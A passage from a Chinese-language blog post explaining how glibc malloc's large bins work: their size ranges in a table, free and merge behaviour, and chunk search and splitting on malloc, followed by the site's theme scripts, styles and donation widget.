<li>一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置</li>
<li>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。如下表所示。</li>
</ol>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<ol start="3">
<li><p>free和合并操作：类似于small bin。</p>
</li>
<li><p>malloc操作：初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。</p>
</li>
<li><p>一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置</p>
</li>
<li><p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。如下表所示。</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
</li>
<li><p>free和合并操作：类似于small bin。</p>
</li>
<li><p>malloc操作：初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。</p>
</li>
</ol>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 3299391667@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">💰</a>
</p>






    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="//cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML">
</script>
<input type="hidden" id="MathJax-js"
        value="//cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML">
</input>
    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2023 author
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>Help us with donation</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
        /* 渲染*/
        function HTMLDecode(text) {
            var temp = document.createElement("div");
            temp.innerHTML = text;
            var output = temp.innerText || temp.textContent;
            temp = null;
            return output;
        }
        if (window.mermaid){
            window.mermaid = null
        }
        $.getScript("//cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js", function () {
            var mermaidOptions = JSON.parse(HTMLDecode("{&#34;theme&#34;:&#34;default&#34;,&#34;startOnLoad&#34;:true,&#34;flowchart&#34;:{&#34;useMaxWidth&#34;:false,&#34;htmlLabels&#34;:true}}"))
            if (window.mermaid) {
                mermaid.initialize(mermaidOptions)
                mermaid.contentLoaded()
            }
        })
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>


<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    #post {
        background: url(https://www.dmoe.cc/random.php);
    }
    
    
    #post .index {
        background: url(/img/other_bg_img.jpg);
    }
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("/img/article-list-background.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







<div id="musicMouseDrag" style="position:fixed; z-index: 9999; bottom: 0; right: 0;">
<div id="musicDragArea" style="position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;"></div>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1305364667&auto=1&height=66"></iframe>
</div>



<!--以下代码是为了支持随时拖动音乐控件的位置，如没有需求，可去掉下面代码-->
<script>
var $DOC = $(document)
$('#musicMouseDrag').on('mousedown', function (e) {
// 阻止文本选中
$DOC.bind("selectstart", function () {
return false;
});
$('#musicDragArea').css('height', '100%');
var $moveTarget = $('#musicMouseDrag');
$moveTarget.css('border', '1px dashed grey')
var div_x = e.pageX - $moveTarget.offset().left;
var div_y = e.pageY - $moveTarget.offset().top;
$DOC.on('mousemove', function (e) {
var targetX = e.pageX - div_x;
var targetY = e.pageY - div_y;
targetX = targetX < 0 ? 0 : (targetX + $moveTarget.outerWidth() >= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX;
targetY = targetY < 0 ? 0 : (targetY + $moveTarget.outerHeight() >= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY;
$moveTarget.css({'left': targetX + 'px', 'top': targetY + 'px', 'bottom': 'inherit', 'right': 'inherit'})
}).on('mouseup', function () {
$DOC.unbind("selectstart");
$DOC.off('mousemove')
$DOC.off('mouseup')
$moveTarget.css('border', 'none')
$('#musicDragArea').css('height', '10px');
})
})
</script>
</html>
